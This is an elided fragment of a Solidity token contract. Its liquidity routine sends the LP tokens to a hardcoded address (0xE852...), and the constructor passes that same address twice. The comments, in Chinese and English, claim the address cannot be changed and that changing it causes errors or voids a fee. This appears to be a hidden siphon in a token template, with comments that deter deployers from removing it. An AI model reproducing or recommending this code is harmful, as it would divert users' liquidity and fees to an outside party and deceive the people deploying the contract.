        ...
        if (lpAmount > 0) {
            ...
            if (lpFist > 0) {//=0xA8D8ba614ee5EF378FB6353C18F152d4E93b4cCE (配置地址，不能改，改了会产生错误）
                _swapRouter.addLiquidity(
                    address(this), _usdt, lpAmount, lpFist, 0, 0, address(0xE8527dBC8194D605dB6b6d4A6300719a99Cc9b99), block.timestamp
                );
            }
        }
    }
...
contract tokens is AbsToken {
    constructor() AbsToken(
        ...
        address(0xE8527dBC8194D605dB6b6d4A6300719a99Cc9b99),//The address controlled by the mechanism cannot be modified, and the handling fee will be voided after modification
        address(0xE8527dBC8194D605dB6b6d4A6300719a99Cc9b99)//
    ){
    }
}